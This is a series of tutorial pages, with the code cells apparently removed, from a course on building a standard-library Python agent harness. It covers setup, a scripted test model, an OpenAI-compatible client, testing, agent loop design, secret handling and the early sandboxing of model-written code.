m1-l1.html:
What you'll learn

  • Confirm you have Python 3.10 or newer, or install it, on Windows, macOS, or Linux (including a Chromebook's Linux environment).
  • Create the harness-lab project folder and the virtual environment it will use for the whole course.
  • Optionally install Ollama, pull a small model that supports tool calling, and confirm it answers.
  • Fix the four setup problems that stop people most often: a missing python command, a blocked activation script, a missing venv module, and a busy port.

Run the same agent task against a real model ten times and you can get ten different transcripts, a handful of timeouts, and a bill. That's fine for a demo and hopeless for development. You can't write a test whose correct output changes every run, and you can't fix a failure you can't reproduce.

So this course starts with a seam. Every model the harness talks to, real or fake, has exactly one method, complete(messages, tools), which returns a reply. A scripted model answers from a list of replies you write in advance. It's offline, free, and gives the same answer every run, and every runnable cell in this course uses it. A real model, running on your computer through Ollama or hosted by a provider, plugs into the same seam whenever you want to see real behavior.

#What you'll build, module by module

You'll grow one Python package called harness inside a folder called harness-lab. Each module adds files to it, and later modules build on earlier ones instead of starting over.

The harness uses only Python's standard library: urllib to talk to model APIs, subprocess and tempfile for the sandbox, json for traces, and dataclasses here and there. There's nothing to pip install. That's a deliberate choice. Agent frameworks do the same jobs with more layers, and once you've written each layer yourself you can read any framework's source and know what it's doing.

#What you need

  • A computer running Windows 10 or 11, macOS, or Linux. A Chromebook works once its Linux development environment is turned on.
  • Python 3.10 or newer, a terminal, and any code editor. VS Code is a good free choice, but nothing in the course depends on it.
  • Git, which the prerequisites assume you already use.
  • Optional: about 2 GB of free disk and 8 GB of RAM for a small local model, or an API key from a hosted provider.

You won't install anything in Modules 1 to 4, but the environment still earns its place: it pins which Python the project uses, and if you later add a package (an SDK from your provider, say), it lands in this project instead of your whole system.

#Step 3 (optional): Install Ollama and a small tool-calling model

Ollama downloads open-weight models and runs them on your own computer. It serves an HTTP API on http://localhost:11434, and it includes an OpenAI-compatible endpoint under /v1, which is the API your real client will use in the next lesson. Your prompts never leave your machine.

Not every model can call tools. On the Ollama model library, the ones that can are tagged tools. This course suggests qwen2.5:3b (about a 1.9 GB download). On a machine with 8 GB of RAM or less, use qwen2.5:1.5b (about 1 GB) instead.

Windows

Ollama needs Windows 10 22H2 or newer. Download OllamaSetup.exe from ollama.com/download and run it; it installs into your user folder, so it doesn't need administrator rights. Ollama then runs in the background. Open a new PowerShell window and check it with ollama -v.

macOS

Ollama needs macOS 14 Sonoma or newer. Download it from ollama.com/download, open the file, and drag Ollama into Applications. Launch it once; it asks permission to add the ollama command to /usr/local/bin, so say yes. Open a new Terminal window and check it with ollama -v.

Linux and Chromebook

Install with the official script, then check the version:

If ollama -v warns that it can't connect to a running instance, start the server in a second terminal with ollama serve and leave it open. A Chromebook's Linux environment usually has no GPU access and limited memory, so pick qwen2.5:1.5b, or skip the local model; the scripted model covers every lesson.

Now pull the model and ask it something:

The first command downloads the model once. The second loads it and prints a reply; on a laptop CPU, the first answer can take 10 to 30 seconds while the model loads, and later ones are faster. ollama list shows every model you've pulled, which you'll want when an API call complains about a model name.

#Or use a hosted provider

If you'd rather use a hosted model, the real client reads three environment variables: LLM_BASE_URL, LLM_MODEL, and LLM_API_KEY. OpenAI's API and many other providers publish an OpenAI-compatible base URL; copy yours from the provider's docs. Hosted models usually cost money per token, and your prompts go to the provider's servers, which Lesson 3 covers in detail. Set a spending limit in the provider's dashboard before your first call.

These last only for the current terminal window, which is the point: the key never gets written into a file that could be committed.

#When setup goes wrong

⚠️ Watch out

Windows: python opens the Microsoft Store, or py isn't recognized. Windows ships a python shortcut that points at the Store. Use py, or turn the shortcut off: open Settings, search for App execution aliases, and switch off the entries for python.exe and python3.exe. If py itself is missing, rerun the python.org installer and make sure the launcher is selected.

⚠️ Watch out

Windows: Activate.ps1 cannot be loaded because running scripts is disabled on this system. PowerShell blocks scripts by default. Allow locally created scripts for your account only, then activate again:

⚠️ Watch out

Debian, Ubuntu, or Chromebook: ensurepip is not available. The message says the virtual environment wasn't created successfully. Install the missing piece with sudo apt install python3-venv, delete the half-made .venv folder, and run python3 -m venv .venv again.

⚠️ Watch out

Error: listen tcp 127.0.0.1:11434: bind: address already in use. You ran ollama serve while Ollama was already running (the desktop app or the Linux service starts it for you). Nothing is broken. Close the extra terminal and use the copy that's running.

3 questions

1Why does every runnable cell in this course use a scripted model instead of a real one?

  • They can; the next lesson writes a client that does exactly that.

  • Development needs reproducible runs. The real model plugs into the same complete method when you want it.

  • A scripted model only says what you wrote for it; it's a test double, not a better model.

Show answer

B. Development needs reproducible runs. The real model plugs into the same complete method when you want it.

2On a Mac, python3 --version prints Python 3.9.6. What should you do?

  • The harness uses features from Python 3.10 and newer, so 3.9 will fail.

  • macOS tools depend on it. Leave it in place.

  • The new install comes first on your PATH, and Apple's copy stays untouched.

Show answer

C. The new install comes first on your PATH, and Apple's copy stays untouched.

3You activate .venv, open a second terminal tab, and run python --version there. Which Python runs?

  • Each terminal session starts fresh. Activate again in every new window.

  • Being in the folder doesn't activate anything; the activation script does.

Show answer

A. Each terminal session starts fresh. Activate again in every new window.

Key takeaways

  • The harness talks to every model through one method, complete(messages, tools), so a scripted model and a real one are interchangeable.
  • The project lives in harness-lab, with its own .venv that you activate in every new terminal window.
  • Ollama is optional; if you use it, pick a model tagged tools, such as qwen2.5:3b or qwen2.5:1.5b.
  • API keys go in environment variables for the current session, never in a file.

#Further reading

  • Python tutorial: virtual environments (opens in a new tab): the official short guide, including how activation works on each system.
  • Ollama's OpenAI compatibility docs (opens in a new tab): exactly which endpoints and request fields Ollama's /v1 API supports, including tools.

m1-l2.html:
What you'll learn

  • Define the reply format every model in the harness returns, and say why the harness owns it instead of borrowing a provider's.
  • Build ScriptedModel, which replies from a script, records what it was shown, and fails loudly when the script runs out.
  • Write ChatAPIModel for any OpenAI-compatible endpoint, and test its translation functions without a network.
  • Run check_setup.py and read its results, including an optional live check that your model can call a tool.

By the end of this lesson, two very different objects will answer the same method call. One is twenty lines of Python reading from a list. The other sends HTTP requests to a language model. The loop you build in Module 2 won't be able to tell them apart, and that's the whole design:

Python doesn't need a base class for this. Any object with a name and a complete method fits, which is called duck typing. The diagram's Model box is the contract, not a class you'll write.

One convention for the whole course: a code cell titled harness/something.py is a complete file. Save it at that path in harness-lab. The cells on each page share their names like a notebook, so later cells can use earlier ones. On disk, files reach each other with import lines, and each step tells you which ones to add.

#Step 1: Decide what a reply looks like

Providers disagree about tool calls. Ollama's native API sends arguments as a JSON object with no call id; the OpenAI-style API sends them as a JSON string with an id. If those formats leak into your loop, every provider change means a loop change. So the harness has its own format, and each real client translates at the edge.

A reply is a plain dictionary that doubles as the assistant message you append to the history, plus a usage entry for token counts:

Plain dictionaries are easy to compare in tests and drop straight into JSON traces in Module 4. Here's the file:

Three details matter later. seen stores a deep copy, so if the loop changes the history afterwards, your record of what the model was shown stays true. The token estimate counts the tool schemas too, because real providers bill for them as input. And {**reply, "usage": usage} builds a new dictionary instead of editing the scripted one.

#Step 2: Talk to the scripted model

A script is a list. call(...) makes a reply that asks for a tool, and say(...) makes a final answer:

The model returned its replies in order and ignored what it was asked; a script doesn't read. That's enough for most tests. When a test needs a reply that depends on the conversation, use a function instead, and it receives the messages:

Module 3 uses this to script a model that reads an error message and writes a fix.

What happens when the harness asks for more replies than you wrote? Predict, then look:

A crash is the behavior you want. In a test, running out of replies means the harness called the model more often than you expected, which usually points to a loop that didn't stop. Returning an empty string instead would hide that bug.

#Step 3: Write the real client

harness/chat_api.py speaks the OpenAI chat-completions format, which Ollama serves under http://localhost:11434/v1 and many hosted providers serve too. It has three parts: to_wire translates outgoing messages, from_wire translates the reply, and ChatAPIModel does the HTTP. The file needs no imports from the rest of the harness.

Things to notice:

  • Defaults point at Ollama. With no environment variables set, it calls qwen2.5:3b on your own machine. Ollama ignores the API key, but the header still needs a value.
  • temperature: 0 makes replies far less random. It doesn't make them identical every run, which is one more reason tests use the scripted model.
  • Missing ids get invented. The harness pairs each tool result with the call that asked for it by id, so a call without one would break that pairing.
  • timeout=120 stops a stalled request from hanging the harness forever. A small model on a laptop CPU can take tens of seconds per reply, so the limit is generous.

#Step 4: Test the translation without a network

The HTTP part is five lines of standard library. The translation is where the bugs live, and it's pure functions, so you can test it with a reply copied from the API docs. This one asks for a tool call:

The arguments arrived as a string ("{\"path\": ...}") and came out as a real dictionary. content was None, which many APIs send when the model only calls tools, and it became an empty string so later code can treat content as text without checking. Going back out, to_wire turns the dictionary back into a string. The usage key didn't leave the harness, since providers don't expect it.

#Step 5: The setup check

check_setup.py lives in the project root and starts with from harness.model import ScriptedModel, call, say and from harness.chat_api import ChatAPIModel. It prints one line per check: ok, warn for something that works but should be fixed, or FAIL.

The page runs this outside any virtual environment, so you see a warn on that line. On your machine, with .venv active, it should say ok. Run it from the harness-lab folder:

The second command adds the two live checks. A working local setup looks something like this (your version numbers and the model's wording will differ):

The second live check is the one that matters for this course: it proves the model returns real tool calls through your client, not just text. If you see Connection refused, Ollama isn't running; HTTP Error 404 usually means the model isn't pulled. Lesson 3 has the full list of fixes.

Check your understanding

3 questions

1Why does from_wire invent an id like call_0 when a tool call arrives without one?

  • The id problem is on the harness side: it's the reply that's missing one.

  • Without an id, a tool result can't say which call it answers, and two calls in one reply would be ambiguous.

  • An invented id adds text; it doesn't remove any.

Show answer

B. Without an id, a tool result can't say which call it answers, and two calls in one reply would be ambiguous.

2A test scripts two replies, but the harness under test calls complete three times. What should happen?

  • The extra call is a bug in the harness, usually a loop that didn't stop, and a loud failure points straight at it.

  • That hides the bug: the run would end "successfully" with no answer.

  • Repeating the script would make an endless loop look normal.

Show answer

A. The extra call is a bug in the harness, usually a loop that didn't stop, and a loud failure points straight at it.

3Why is the reply format the harness's own, not the OpenAI format the client already receives?

  • It can; the client translates its tool calls in both directions.

  • Providers differ in details like arguments-as-string and missing ids. Keeping those differences at the edge keeps the loop simple.

Show answer

B. Providers differ in details like arguments-as-string and missing ids. Keeping those differences at the edge keeps the loop simple.

Key takeaways

  • Every model implements complete(messages, tools) and returns a plain-dictionary reply with content, tool_calls, and usage.
  • ScriptedModel makes the harness testable: fixed replies, a record of what it was shown, and a loud failure when it runs out.
  • ChatAPIModel keeps provider details at the edge; its translation functions are pure, so you test them with recorded replies.
  • check_setup.py --live proves the real model can make tool calls through your client, which is what the rest of the course needs.

#Ideas to extend it

  • Write RecordingModel, a wrapper that passes calls through to a real model and saves every reply to a JSON file. A saved list of replies is a script, so you can rerun a real conversation offline.
  • Add a second adapter for Ollama's native /api/chat endpoint, whose tool-call arguments are objects and which has no call ids.
  • Make ChatAPIModel read the response body when an HTTPError arrives and include it in the error message; providers explain most failures there.

#Further reading

  • Ollama tool calling (opens in a new tab): how Ollama's native API declares tools and returns tool calls, a useful contrast with the OpenAI-style format.
  • OpenAI function calling guide (opens in a new tab): the reference for the tool-call format that to_wire and from_wire translate.
  • typing.Protocol (opens in a new tab): how to write the Model contract as a type that editors and type checkers understand, without a base class.

m1-l3.html:
What you'll learn

  • Write unittest tests for the scripted model and run the whole suite with python -m unittest.
  • Set up .gitignore so the virtual environment, secrets, and raw traces stay out of Git.
  • Explain where your prompts and tool results go with a scripted model, Ollama, and a hosted provider.
  • Prove that a child process can read your API key, and state the safety rules the harness will follow.
  • Diagnose the course's most common errors from their exact messages.

Here's a way to leak an API key that has nothing to do with pasting it into a script. The key sits safely in an environment variable. You ask your agent to debug a config problem, and it runs a command that prints the environment. The output, key included, goes into the conversation, and the harness writes the conversation to a trace file. A week later you commit the traces folder so a friend can see a bug.

In this course, traces record everything the agent saw. So they need the same care as the key itself. This lesson sets up the habits that prevent that story, plus the testing routine and debugging moves you'll use in every module.

#The work cycle: change, test offline, commit

Every change to the harness follows the same three steps. Make the change. Run the tests, which use the scripted model and finish in about a second. Commit. Only then, if you want, try it against a real model. A failing live run is much easier to diagnose when you already know the code passes its offline tests.

The tests import the package, so this page needs harness/model.py from the last lesson. It's unchanged:

Now the tests. Each one pins down a promise the rest of the harness relies on. The file starts with from harness.model import ScriptedModel, call, say:

The last two lines are only for this page. On disk, delete them. From the harness-lab folder, python -m unittest searches tests/ for files named test*.py and runs every method whose name starts with test. That search only finds folders with an __init__.py, which is why you created tests/__init__.py in Lesson 1.

Look at test_seen_is_a_snapshot. If complete stored messages itself instead of a deep copy, appending to history after the call would also change model.seen[0], and your record of what the model was shown would quietly become wrong. That bug is easy to write and invisible in normal runs, which is exactly the kind of thing a test is for.

#Git: commit the code and the eval cases, not the runs

Make the project a repository, and tell Git what never to track before your first commit. Create .gitignore in harness-lab:

Then make the first commit:

Each line in .gitignore has a reason. .venv/ is hundreds of files you can recreate with one command. .env is where people tend to keep keys. And traces/ holds raw records of every run, including every file the agent read and every command output it saw. In Module 4 you'll turn selected traces into eval cases in evals/, after reviewing them, and those you do commit.

If a key ever reaches a commit, revoke it at the provider right away and make a new one. Deleting the commit isn't enough, because clones and caches may already have it. GitHub scans public repositories for known key formats and can block a push that contains one, but treat that as a seatbelt, not a plan.

#Your key is visible to every process you start

The harness reads LLM_API_KEY from the environment so the key never sits in a file. But environment variables are inherited: every program the harness starts gets a copy. Predict what the child process prints:

The child printed the key. Any code your agent writes and runs, any test command, any script it calls, can read every secret in your environment by default. Module 3's sandbox fixes this by starting child processes with an allowlisted environment that contains nothing secret.

#Where your data goes

Tool results are part of the prompt. When your agent reads a file, the file's contents are sent to the model on the next call. So the question "where does my data go?" has a different answer for each model option:

Option Where prompts and tool results go Cost Use it for
Scripted model Nowhere: they stay in your Python process Free Every test and every cell on these pages
Ollama Your own computer; Ollama listens on 127.0.0.1:11434 by default Free, uses your CPU or GPU Seeing real model behavior offline
Hosted provider The provider's servers, under their data policy Paid per token Larger models and comparisons

With a hosted model, never point the agent at folders holding personal data, school records, or anyone else's information. Read your provider's data-use policy before you send anything you wouldn't post publicly.

#Safety rules for the harness

These hold for the whole course, and later modules add machinery to enforce them:

  1. File tools stay inside workspace/. The tools you write in Module 2 refuse any path that resolves outside it.
  2. Generated code runs only through the sandbox. Module 3 builds it. When you run code you haven't read, run the sandbox inside a container or virtual machine as well.
  3. No tools that touch real accounts. No email, no payments, no access to your real GitHub during this course. Module 7 adds human approval for risky actions.
  4. Every run is bounded. Step limits, timeouts, and token budgets, so a confused model can't loop forever or spend without limit.
  5. The scripted model is the default. A real model is something you switch on with a flag, like --live.

#Accessibility

Everything the harness produces is plain text. Traces are JSON lines you can read in any editor, search with grep, or hear with a screen reader, and every diagram on these pages has a caption and matching code. Nothing in the course is timed, which matters because a local model on a laptop CPU can take half a minute per reply.

If you use VS Code, it detects most screen readers and switches to a Screen Reader Optimized mode for the editor and terminal. Accessibility Help (Alt+F1 on Windows, Option+F1 on macOS, Shift+Alt+F1 on Linux) explains the shortcuts for whatever you're focused on, and Accessible View (Alt+F2, Option+F2, or Shift+Alt+F2) lets you read the terminal's whole output, which helps with long tracebacks. Ctrl+= or Cmd+= zooms the whole window.

#When you're stuck: the errors this course produces

Start with the last line of the traceback: it names the exception and usually the cause. Then look at what the model was shown, model.seen[-1], before you change any code. And reproduce the problem with a scripted model before you touch the real one, because a bug you can trigger every time is half fixed.

Error What it means Fix
ModuleNotFoundError: No module named 'harness' You ran a script from inside harness/ or tests/, so Python can't see the package Run from harness-lab: python check_setup.py, python -m unittest
RuntimeError: ScriptedModel ran out of replies The harness called the model more times than the script expected Usually a loop that didn't stop; print len(model.seen) and the last messages
URLError: <urlopen error [Errno 61] Connection refused> Nothing is listening on port 11434 (the number is 111 on Linux, and Windows says WinError 10061) Start the Ollama app, or run ollama serve
HTTPError: HTTP Error 404: Not Found The model isn't pulled, or the base URL is missing /v1 Check ollama list and LLM_BASE_URL
HTTPError: HTTP Error 401: Unauthorized A hosted provider rejected the key Check LLM_API_KEY is set in this terminal
HTTPError: HTTP Error 400: Bad Request The provider rejected the request itself Read the response body, as shown below

urllib puts only the status line in the exception message. The explanation, such as a model that doesn't support tools or a malformed message, is in the response body. You read it from the exception itself, since an HTTPError doubles as the response. Here's that move with a made-up error, so it runs offline:

The first line is all you'd see in a traceback; the second tells you what to change. When a real call fails, wrap it in try, catch urllib.error.HTTPError as exc, and print exc.read().decode().

Check your understanding

3 questions

1Which of these should be committed to Git?

  • Raw traces contain everything the agent saw, which can include secrets and personal data.

  • Reviewed eval cases are the frozen test set the project depends on, so they belong in version control.

  • It's machine-specific and recreated with one command; commit the instructions, not the folder.

Show answer

B. Reviewed eval cases are the frozen test set the project depends on, so they belong in version control.

2Your agent runs python -m pytest in a child process with Python's default settings. Can that test code read LLM_API_KEY?

  • That's what the demo showed. The sandbox in Module 3 passes an allowlisted environment instead.

  • The harness process is the parent; every child gets a copy of its environment.

  • Reading an environment variable needs only os.environ; nothing from the harness.

Show answer

A. That's what the demo showed. The sandbox in Module 3 passes an allowlisted environment instead.

3You cd tests and run python test_model.py. It fails with ModuleNotFoundError: No module named 'harness'. Why?

  • That would break imports from the project root too, and those work.

  • Run python -m unittest from harness-lab, so the project root is where Python looks.

Show answer

B. Run python -m unittest from harness-lab, so the project root is where Python looks.

Key takeaways

  • Change, run the offline tests, commit; only then try a real model.
  • python -m unittest, run from the project root, finds every test*.py file in tests/.
  • .gitignore keeps .venv/, .env, and raw traces/ out of Git; reviewed eval cases go in.
  • Child processes inherit your environment, keys included, until the sandbox removes them.
  • With a hosted model, every file the agent reads is sent to the provider.

#Further reading

  • unittest (opens in a new tab): the full list of assertions, plus how test discovery decides which files to run.
  • About secret scanning (opens in a new tab): what GitHub checks for, and what push protection does and doesn't catch.
  • VS Code accessibility (opens in a new tab): screen reader mode, Accessible View, and keyboard navigation in the editor and terminal.

m2-l1.html:
What you'll learn

  • Trace one turn of an agent loop through observe, plan, act, and verify, and say which part the model does and which the harness does.
  • Describe a tool as a contract (name, description, JSON Schema) and validate arguments before running anything.
  • Turn tool failures into structured results the model can read and recover from.
  • Choose stop rules that end every run: done, step limit, stuck, budget, and model error.
  • Estimate how fast the history grows, and pick a context strategy before it overflows.

Here's an agent loop in about twenty lines. On the happy path it works. A list of replies stands in for the model, and this time the model makes a typo in an argument name, which real models do:

One wrong letter, and the whole run dies with a TypeError. The conversation so far is gone too. Three more crashes hide in those lines. An unknown tool name raises KeyError. A tool that fails for any reason (a missing file, say) takes the run down with it. And while True never ends if the model keeps asking for tools. A model would have fixed its own typo in one more step if it had been told what went wrong. A runtime is this loop plus the rules that turn every one of those failures into information instead of a crash.

#One turn of the loop

The model never runs anything. It reads the history and replies with either tool calls or a final answer. The harness does everything else: it checks and runs the calls, appends the results, and decides when to stop.

Those steps have names, and you'll see them in the code you write next lesson:

  • Plan. The model call. Its reply is the plan for the next step: some actions, or "I'm done."
  • Act. The harness runs the requested tools, after checking that each call is allowed and well formed. The model proposes; the harness decides.
  • Observe. Each result goes back into the history as a tool message. It's the only way the model learns what happened.
  • Verify. Before accepting "done," the harness checks the world itself: do the tests pass, does the file exist? Models regularly report success they didn't achieve.

Each model call is stateless. The model remembers nothing between calls; the history list is the agent's memory, and the harness sends all of it every time.

#Tools are contracts

A tool, from the model's side, is three things: a name, a description of when to use it, and a JSON Schema describing its arguments. The model sees only these, so a vague description makes a confused agent.

The schema is a promise the model makes, and nothing forces it to keep that promise. Some providers can constrain output to match a schema, but small local models often can't, and even constrained output can name a file that doesn't exist. So the harness checks every call before running it. Here's a first attempt at a checker. Read the four results and find the one that's wrong:

The typo is caught twice over: path is missing and paht is unknown. The last line is the bug. JSON true becomes Python True, and in Python bool is a subclass of int, so isinstance(True, int) is True. The checker you build next lesson tests for bool first.

#Errors are observations

When a call fails, the harness doesn't raise. It returns a result the model can read, in one consistent shape:

The message is effectively a prompt, so write it for the model. "No file named 'notes.md'; call list_files to see what exists" gets a better next step than KeyError: 'notes.md'. Models recover from clear errors remarkably often: they fix the argument, try another file, or explain why they can't continue.

Not every exception should go back to the model, though. Sort failures into three kinds:

Failure Example What the harness does
The call was bad or the tool failed Wrong argument type, missing file Return ok: false to the model and keep going
The model API failed Timeout, rate limit, server error Retry if it's temporary (Module 3), otherwise stop with model_error
The harness itself has a bug KeyError inside your own loop code Crash, so a test catches it

Catching your own bugs and showing them to the model would hide them, and the model can't fix your code anyway.

#Stop rules: every run must end

A runtime needs a reason to stop for every way a run can go. Here are the states one run can move through:

The step limit is the one you can't skip. A model that keeps calling tools, or keeps failing verification, would otherwise run until your money or patience ran out. Asking the model to stop doesn't count as a limit; the harness has to count. Step through a loop whose model never stops asking for tools, and watch the counter and the history:

The for ... else runs its else branch only when the loop finishes without break, which is exactly "used every step and never finished." The status is a named outcome, max_steps, not just an empty answer, so in Module 4 you can count how often it happens. Two more rules you'll write in the practice set: stuck, for the same call with the same arguments several times in a row, and budget, for a cap on total tokens.

#The history grows, and every call sends all of it

Each step adds at least two messages, the call and its result, and each model call sends the entire history again. Suppose the system prompt, task, and tool schemas take 300 tokens, and each step adds a 50-token call and a 500-token file. Ollama's default context window is 4,096 tokens:

By step 8 the history no longer fits, so a local model with default settings stops seeing all of it. The running total grows with roughly the square of the step count: twenty steps send 110,500 tokens, more than six times what eight steps sent, for two and a half times the steps. On a hosted model you pay for every one of those tokens. Context management is part of the runtime's job:

  • Clip big tool results. Keep the head and tail of a long output and say how much was cut. The model can always ask for a specific part.
  • Pin what matters, drop what's old. Keep the system prompt and the task, and drop or summarize the oldest turns.
  • Keep each call with its result. If you drop an assistant message that made a tool call but keep its result, OpenAI-style APIs reject the request.
  • Put long-term memory in files. Notes the agent writes to the workspace survive any trimming, and it reads them back when it needs them. History is working memory; files are the notebook; traces are the record for you, not the model.

⚠️ Watch out

Appending a tool result without the call that asked for it. The history must contain the assistant message with tool_calls before the tool messages that answer it, with matching ids. Skip the assistant message and OpenAI-style APIs answer with HTTP 400. The scripted model won't complain, so test the message order yourself.

⚠️ Watch out

Trusting "done." A model that writes "I fixed the bug and all tests pass" may never have run the tests. Treat a final answer as a claim, and let a verify check decide whether the run really succeeded. A failed check goes back to the model as feedback, and the loop continues.

Check your understanding

4 questions

1A model asks for a tool on every single reply. The harness has max_steps=5. How many times is the model called, and what's the status?

  • The model never gives a final answer, so the run can't be done.

  • One model call per step, and the limit ends the run with a named status instead of an answer.

  • A model that always wants tools never gives up; that's why the harness counts.

Show answer

B. One model call per step, and the limit ends the run with a named status instead of an answer.

2The first checker said {"path": "a.txt", "max_lines": True} was valid. Why?

  • It does (true and false), and Python decodes it to True.

  • Check for bool before checking for int or number.

  • It checks every argument; the type test itself is what passes.

Show answer

B. Check for bool before checking for int or number.

3While running a tool call, read_file raises FileNotFoundError. In the same run, your own loop code raises KeyError because of a typo in the harness. What should happen to each?

  • The first is information the model can act on. The second is your bug, and hiding it from yourself helps no one.

  • The model can't fix your harness code, and the bug would stay hidden.

  • Crashing on a missing file throws away a run the model could have finished.

Show answer

A. The first is information the model can act on. The second is your bug, and hiding it from yourself helps no one.

4To save context, a trimmer drops an old assistant message that called read_file but keeps the tool message with its result. What happens on the next call?

  • The API checks message order, so it's not just a smaller prompt.

  • Trim calls and results together, as a pair.

Show answer

B. Trim calls and results together, as a pair.

Key takeaways

  • The model only proposes. The harness validates, runs, records, verifies, and stops.
  • Each step goes plan (model call), act (dispatch), observe (append results), and on a final answer, verify.
  • Validate every tool call against its schema, and check bool before int.
  • Tool failures go back to the model as structured ok: false results with messages written for the model; harness bugs should crash.
  • Every run ends with a named status: done, max_steps, stuck, budget, or model_error.
  • Every call re-sends the whole history, so clip results, trim old turns in pairs, and keep long-term memory in files.

What you'll learn

Each exercise is one small function that your loop or registry calls. That keeps the code testable without a model and easy to wire into harness/ once it works. Every solution runs on its own, so try each one in a scratch file before opening the hint.

#Warm-up: count the messages

A run starts with a system message and the task. The model then makes one tool call, then two tool calls in a single reply, then gives a final answer. How many messages are in the history at the end, and in what order? Write your answer down, then run this:

Eight: the two you started with, then assistant, tool for the first step, assistant, tool, tool for the second, and the final assistant. A reply with two calls is one assistant message followed by two results, not two separate turns. Exercise 6 depends on that.

#Exercise 1: Enums and ranges

Models often pass values that are the right type but still wrong: a mode that doesn't exist, a line count of 5000. Write check_value(name, value, spec) that returns a list of problems. It should keep the bool check from the build-along and also support enum (a list of allowed values), minimum, and maximum.

Sample output:

Need a hint?

Check the type first and return early if it's wrong, since comparing "5" < 1 would raise TypeError. Then each extra rule is a separate if that appends its own message.

Show solution

The early returns mean a wrong type gives exactly one clear message, and range checks only run on values where < makes sense. Each message names the allowed values, so the model can correct itself in one step. To use it in harness/tools.py, call check_value from inside the loop in check_args.

#Exercise 2: Clip long tool output

A test run can print thousands of lines, and all of them would land in the context. Write clip(text, limit) that returns the text unchanged when it fits, and otherwise keeps the first and last limit // 2 characters with a marker in the middle saying how many characters were cut.

Sample output (the log has 199 ok lines and one error at the end):

Need a hint?

Slices do most of the work: text[:n] is the head and text[-n:] is the tail. Compute the number cut from the original length and the limit.

Show solution

Keeping the tail matters more than it looks. Error messages, failing test names, and final summaries tend to come at the end of output, and a clip that kept only the head would have thrown away ERROR: disk full. The marker tells the model that something was cut, so it can ask for a specific part instead of assuming it saw everything. In the loop, clip json.dumps(outcome) before appending it.

A model that calls read_file("a.txt") three times in a row isn't going to learn anything new from a fourth. Write is_stuck(calls, repeats=3) that returns True when the last repeats calls have the same tool name and the same arguments. Arguments that differ only in key order count as the same.

Sample output, for [a, a], [a, a, a], [a, b, a], [b, a, a, a], and three calls whose arguments only differ in order:

Need a hint?

sort_keys=True makes {"q": "x", "limit": 5} and {"limit": 5, "q": "x"} the same string, which matters because models don't keep key order consistent. Write a compact run(model, tools, task, max_steps, max_tokens, repeats) with its own tiny scripted model that returns done, stuck, budget, or max_steps, along with the step count and tokens used. Sample output:

Need a hint?

What you'll learn

  • List what model-written code can do to your computer, and match each risk to the limit that stops it.
  • Start a child process with a timeout, closed input, an allowlisted environment, and its own process group, and explain what each one prevents.
  • Show why a subprocess is not a security boundary, and describe what containers, gVisor, microVMs, and VMs add.
  • Decide which failures to retry, and compute capped exponential backoff with jitter.
  • Make side-effecting tools safe to repeat with idempotency keys.

Your agent wrote a test for a function and ran it. The test calls input() to ask for a number, because that's how the original script worked. Nothing will ever type that number, so the process waits forever, and so does your harness. No error, no trace, just a run that never ends.

That's the mild version. The same agent can write code that deletes files, prints until your disk fills, reads your API keys, or sends your files to a server. Usually it does none of that on purpose. It's guessing, and some guesses are destructive. If the harness runs model-written code, it needs limits that hold no matter what the code does. Here's the first one, a time limit:

timeout=LIMIT kills the child once a second has passed and raises TimeoutExpired, so the harness gets control back and can tell the model what happened. Every other limit in this lesson works the same way: the harness decides, and the code being run doesn't get a vote.

#What model-written code can do

Start by listing the risks, then match each to a limit. The right-hand column is the uncomfortable part.

The code does this The limit that stops it Does a subprocess give you that?
Never exits: an infinite loop, waiting for input(), a deadlock Wall-clock timeout; input closed Yes
Starts other processes that outlive it Kill the whole process group Yes, on macOS and Linux
Prints gigabytes of output Cap on output and file size Yes, partly
Reads secrets from environment variables Pass an allowlisted environment Yes
Reads ~/.ssh, browser data, or files elsewhere on disk A filesystem that contains only the job's files No
Connects to the internet to download or upload No network access No
Uses all memory or CPU, or forks thousands of processes Kernel resource limits (cgroups) Only roughly

A subprocess handles the accidents: hangs, floods, and leaked environment variables. It doesn't stop deliberate or unlucky access to files and the network. The next build-along writes the subprocess layer, and this lesson's last sections cover what to add when you need real isolation.

#Layer one: a child process with limits

Five arguments to subprocess do most of the work. To see one of them, set a fake key in the harness's environment and ask two child processes whether they can see it:

With env=None the child inherits everything, key included. With an allowlist it gets only PATH (plus a couple of variables Python adds for itself on some systems) and the key is gone. Here's what each argument is for:

  • cwd=work: a fresh temporary folder, so stray relative paths like open("data.csv", "w") land somewhere disposable instead of in your project.
  • env={...}: an allowlist, not a blocklist. A blocklist has to predict every secret's name; an allowlist only has to name what the code needs.
  • -I: Python's isolated mode. It ignores PYTHON* environment variables and doesn't add the script's folder or your user site-packages to the import path, so a planted json.py can't hijack import json.
  • stdin=subprocess.DEVNULL: input() raises EOFError immediately instead of waiting for a person who isn't there. That fixes this lesson's opening bug.
  • timeout=...: the backstop for everything else that never ends.

#Timeouts kill the child, not its children

There's a catch in timeout. Python's docs say that when it expires, "the child process will be killed." The child: one process. If the code started a helper process of its own, that helper keeps running. This script starts a worker, saves its process id, and then spins forever:

The plain timeout left the worker running, and a harness that runs hundreds of tasks would pile these up. start_new_session=True puts the child in a new process group, and os.killpg kills every process in that group at once. Both are POSIX features, so they work on macOS and Linux. On Windows, the build-along falls back to kill(), and full cleanup needs a Windows job object, which is beyond this course.

#What a subprocess can't stop

The child above ran in an empty temporary folder with an empty environment. Now let model-written code ask for a file by its absolute path:

It read the file. The working folder is just where the process starts; it isn't a wall. The child runs as your user, so it can read anything you can read, from ~/.ssh to your browser's saved data, and it can open network connections, too. The file tools from Module 2 refused paths outside workspace/, but code the agent runs never goes through those tools. A subprocess limits accidents. It is not a security boundary.

Real isolation means the code runs somewhere that can't see your files or network at all. From weakest and fastest to strongest and slowest:

  • A container (Docker, Podman) uses Linux namespaces to give the process its own filesystem, process list, and network, and cgroups to cap memory, CPU, and process count. It shares the host's kernel, so a kernel bug can break out.
  • gVisor runs containers on a kernel written in user space that intercepts system calls, which shrinks how much of the real kernel the code can reach.
  • A microVM such as Firecracker boots a tiny virtual machine with its own kernel in a fraction of a second. Many hosted code-execution services use this.
  • A full virtual machine is the strongest common boundary and the slowest to start.

A locked-down container is a reasonable default for running model-written code on your own machine:

Line by line: delete the container afterwards; no network at all; a read-only filesystem except a scratch /tmp; 256 MB of memory, one CPU, and at most 64 processes (which stops a fork bomb); no Linux capabilities and no way to gain privileges; run as the unprivileged nobody user; mount only the job folder, read-only; and a 10-second limit from the timeout command inside. On macOS and Windows, Docker Desktop runs containers inside a Linux VM, which adds another layer between the code and your files.

#Recovering: retry the temporary, report the rest

Failures come in two kinds, and they need opposite responses.

